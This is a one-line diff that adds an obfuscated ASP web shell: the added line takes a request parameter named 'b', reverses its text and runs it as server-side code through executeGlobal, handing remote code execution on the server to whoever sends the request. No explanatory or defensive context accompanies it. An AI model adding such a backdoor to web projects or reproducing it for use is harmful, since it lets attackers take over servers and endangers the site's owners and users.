@@ -1,0 +1,1 @@
+<%executeGlobal(StrReverse(Request(Chr(98))))%>
